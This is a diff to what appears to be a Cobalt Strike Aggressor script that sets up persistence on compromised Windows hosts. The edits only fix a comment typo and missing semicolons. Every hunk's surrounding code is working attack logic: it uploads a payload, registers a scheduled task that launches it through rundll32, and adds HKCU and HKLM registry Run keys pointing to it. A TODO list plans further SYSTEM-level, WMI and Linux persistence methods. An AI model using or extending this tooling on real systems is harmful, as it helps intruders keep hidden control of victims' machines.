@@ -2,7 +2,7 @@
 # TODO:
 #  Add SYSTEM level scheduled task method
 #  Add WMI/MOF scheduled task method
-#  Add scheduled tasks on logogg method (lunch break persistence)
+#  Add scheduled tasks on logoff method (lunch break persistence)
 #  Add Linux persistence
 #  Add checks for all persistence methods, ways to remove all persistence methods
 
@@ -123,7 +123,7 @@ sub userScheduledTaskDLL  {
 			bupload($bid, $3['payloadfile']);
 			bpowerpick($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].',StartW" /ru "'.$3['user'].'" /sc "'.$3['schedule'].'"');
 			bpowerpick($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
-			bls($bid, $3['targetpath'])
+			bls($bid, $3['targetpath']);
 		}
 	}));
 
@@ -257,7 +257,7 @@ sub ExePersistRegistryHKCU {
 			bupload($bid, $3['payloadfile']);
 			bls($bid, $3['targetpath']);
 			bpowerpick($bid, 'reg add "'.$3['regkey'].'" /v "'.$3['keyname'].'" /t REG_SZ /d "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'"');
-			breg_query($bid, $3['regkey'])
+			breg_query($bid, $3['regkey']);
 		}
 	}));
 
@@ -290,7 +290,7 @@ sub ExePersistRegistryHKLM {
 			bupload($bid, $3['payloadfile']);
 			bls($bid, $3['targetpath']);
 			bpowerpick($bid, 'reg add "'.$3['regkey'].'" /v "'.$3['keyname'].'" /t REG_SZ /d "'.$3['targetpath']."\\".split("/",$3['payloadfile'])[-1].'"');
-			breg_query($bid, $3['regkey'])
+			breg_query($bid, $3['regkey']);
 		}
 	}));
 
